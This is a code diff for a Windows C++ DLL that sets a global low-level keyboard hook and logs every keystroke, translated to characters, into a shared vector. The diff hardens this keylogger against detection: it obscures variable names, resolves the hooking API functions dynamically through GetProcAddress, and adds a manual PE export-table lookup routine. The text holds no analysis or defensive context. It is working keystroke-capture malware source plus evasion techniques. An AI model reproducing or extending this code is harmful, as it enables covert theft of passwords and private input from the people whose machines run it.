@@ -6,31 +6,71 @@
 #include <vector>
 #define DLL_EXPORT __declspec(dllexport)
 ///////////////////////////////////////////////////////////////////////
-HHOOK keyboardHook;
-std::vector<std::string>* sharedLogVector = nullptr; // Pointer to the shared vector
+
+HHOOK k_Hook;
+std::vector<std::string>* sharedLogVector = nullptr;
 std::mutex logMutex;
+
 ///////////////////////////////////////////////////////////////////////
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
+void* FindExportAddress(HMODULE hModule, const char* funcName);
 ///////////////////////////////////////////////////////////////////////
+
+HMODULE hUser32 = (HMODULE)GetModuleHandleA("user32.dll");
+
+typedef HHOOK(WINAPI *SetWindowsHookExFn)(int, HOOKPROC, HINSTANCE, DWORD);
+typedef BOOL(WINAPI *UnhookWindowsHookExFn)(HHOOK);
+typedef LRESULT(WINAPI *CallNextHookExFn)(HHOOK, int, WPARAM, LPARAM);
+
+SetWindowsHookExFn MySetWindowsHookEx = (SetWindowsHookExFn)GetProcAddress(hUser32, "SetWindowsHookExA");
+UnhookWindowsHookExFn MyUnhookWindowsHookEx = (UnhookWindowsHookExFn)GetProcAddress(hUser32, "UnhookWindowsHookEx");
+CallNextHookExFn MyCallNextHookEx = (CallNextHookExFn)GetProcAddress(hUser32, "CallNextHookEx");
+
+///////////////////////////////////////////////////////////////////////
+
+void* FindExportAddress(HMODULE hModule, const char* funcName)
+{
+    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)hModule;
+    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)hModule + dosHeader->e_lfanew);
+
+    IMAGE_EXPORT_DIRECTORY* exportDir = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)hModule + ntHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
+
+    DWORD* nameRVAs = (DWORD*)((BYTE*)hModule + exportDir->AddressOfNames);
+    WORD* ordRVAs = (WORD*)((BYTE*)hModule + exportDir->AddressOfNameOrdinals);
+    DWORD* funcRVAs = (DWORD*)((BYTE*)hModule + exportDir->AddressOfFunctions);
+    for (DWORD i = 0; i < exportDir->NumberOfNames; ++i)
+    {
+        char* funcNameFromExport = (char*)((BYTE*)hModule + nameRVAs[i]);
+        if (strcmp(funcNameFromExport, funcName) == 0)
+        {
+            DWORD funcRVA = funcRVAs[ordRVAs[i]];
+            return (void*)((BYTE*)hModule + funcRVA);
+
+        }
+    }
+    return nullptr;
+
+}
 
 DLL_EXPORT void Initialize(std::vector<std::string>* logVector)
 {
-    sharedLogVector = logVector;
-    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
+    sharedLogVector = logVector;  
+
+    k_Hook = MySetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
 }
 
 DLL_EXPORT void Cleanup()
 {
-    if (keyboardHook) UnhookWindowsHookEx(keyboardHook);
+    if (k_Hook) MyUnhookWindowsHookEx(k_Hook);
 }
 
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
     if (nCode == HC_ACTION)
     {
-        KBDLLHOOKSTRUCT* keyInfo = (KBDLLHOOKSTRUCT*)lParam;
-        BYTE keyState[256];
-        GetKeyboardState(keyState);
+        KBDLLHOOKSTRUCT* k_Info = (KBDLLHOOKSTRUCT*)lParam;
+        BYTE k_State[256];
+        GetKeyboardState(k_State);
         WCHAR outputChar[2] = { 0 };
 
         {
@@ -40,7 +80,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
                 case WM_KEYDOWN:
                 case WM_SYSKEYDOWN:
                 {
-                    switch (keyInfo->vkCode)
+                    switch (k_Info->vkCode)
                     {
                         case VK_LSHIFT:
                         case VK_RSHIFT:
@@ -162,12 +202,14 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
                             break;
                         default:
                         {
-                            int result = ToUnicode(keyInfo->vkCode, keyInfo->scanCode, keyState, outputChar, 1, 0);
+                            int result = ToUnicode(k_Info->vkCode, k_Info->scanCode, k_State, outputChar, 1, 0);
                             if (result == 1)
                             {
                                 std::string utf8Char(1, (char)outputChar[0]); 
                                 sharedLogVector->emplace_back(utf8Char);
-                            } else if (result > 1) { 
+                            }
+                            else if (result > 1)
+                            { 
                                 outputChar[result] = L'\0';
                                 std::string utf8Char = std::wstring_convert<std::codecvt_utf8<wchar_t>>().to_bytes(outputChar);
                                 sharedLogVector->emplace_back(utf8Char);
@@ -182,7 +224,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
                 case WM_KEYUP:
                 case WM_SYSKEYUP: // Handle system key ups
                 {   
-                    switch (keyInfo->vkCode)
+                    switch (k_Info->vkCode)
                     {
                         case VK_LSHIFT:
                         case VK_RSHIFT:
@@ -197,5 +239,5 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
         }
     }
 
-    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
+    return MyCallNextHookEx(k_Hook, nCode, wParam, lParam);
 }
